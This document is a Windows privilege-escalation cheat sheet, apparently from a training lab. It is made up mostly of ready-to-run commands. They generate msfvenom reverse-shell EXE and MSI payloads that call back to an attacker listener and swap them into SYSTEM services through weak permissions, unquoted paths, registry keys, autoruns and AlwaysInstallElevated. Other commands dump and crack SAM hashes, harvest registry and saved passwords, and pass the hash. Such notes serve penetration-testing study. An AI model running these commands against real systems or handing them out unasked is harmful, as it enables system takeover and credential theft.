# windows - privesc

### generating reverse shell

---

On kali:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

(this sets an SMB file share service on kali)

On windows:

```bash
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

(this uses SMB file sharing service to transfer files from Kali)

On kali:

```bash
sudo nc -nvlp 53
```

On windows:

```
C:\PrivEsc\reverse.exe
```

### insecure service permissions

---

Check user account perms on "daclsvc" service

```
accesschk.exe /accepteula -uwcqv user daclsvc
```

It has `SERVICE_CHANGE_CONFIG`, meaning that it has permissions to change the service config.

Check is service is running with SYSTEM privileges

```
sc qc daclsvc
```

Check `SERVICE_START_NAME` field and it says `LocalSystem`

Change binary path name:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

### unquoted service path

---

Query `unquotedsvc` service:

```
sc qc unquotedsvc
```

Check if it runs with SYSTEM privileges (SERVICE_START_NAME), also check if BINARY_PATH_NAME is unquoted and contains spaces

Check permissions for Unquoted Path Service:

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
```

BUILTIN\Users group is allowed to write to the directory.

Copy exploit:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae

Run service:

```
net start unquotedsvc
```

### weak registry perms

---

```
sc qc regsvc
```

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

Check if registry service is writable by INTERACTIVE group (all logged-on users)

Overwrite ImagePath registry key to reverse.exe:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

### insecure service executables

---

check if service is running as system:

```
sc qc filepermsvc
```

then check if the BINARY_PATH_NAME is writeable:

```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermsservice.exe"
```

if it is, you can replace filepermsservice.exe with reverse.exe:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

### autoruns

---

query registry for Autoruns:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

check if they are writable:

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

replace program.exe with reverse.exe:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

### always install elevated

---

##### kali

check if keys are set to 0x1:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

kali: generate a reverse shell with .msi file format:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

transfer to windows, run this cmd:

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

##### covenant

Make sure that you have a medium-integrity grunt. 

Enumerate with `PowerUp.ps1` or `SharpUp audit`. Look for 1's on `HKLM` and `HKCU` under `AlwaysInstallElevated Registry Keys`:

Output on SharpUp:

```
=== AlwaysInstallElevated Registry Keys ===

	HKLM:	1
	HKCU: 	1
	
```

Output on PowerUp.ps1:

```
[*] Checking for AlwaysInstallElevated registry key...


AbuseFunction : Write-UserAddMSI

```

On Kali:

```bash
msfvenom -p windows/exec CMD="blahblahblah" -i msi -o file.msi
```

replace "blahblahblah" with shellcode

On Covenant:

```
upload /filepath:"C:\Users\Public\file.msi"

* select file *

ChangeDirectory C:\Users\Public
ls
```

```
shell msiexec /quiet /qn /i file.msi
```

### passwords in registry

---

```
reg query HKLM /f password /t REG_SZ /s
```

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

use winexe to spawn cmd

```
winexe -U 'admin%password' //10.10.241.122 cmd.exe
```

### saved creds

---

List saved creds:

```
cmdkey /list
```

on Kali:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

### SAM

---

copy SAM and SYSTEM files to kali.

```bash
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM > hashes.txt
```

```
hashcat -m 1000 --force hashes.txt /usr/share/wordlists/rockyou.txt
```

### pass the hash

---

```bash
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.180.131 cmd.exe 
```

### autologons

---

On Covenant:

* Enumerate with `PowerUp.ps1` or `Seatbelt WindowsAutoLogon` to view Autologon credentials

### FODHelper

---

On Covenant, with a Medium integrity shell:

```
PowershellImport

* select helper.ps1 *

powershell helped -custom "cmd.exe /c <blah>"
```

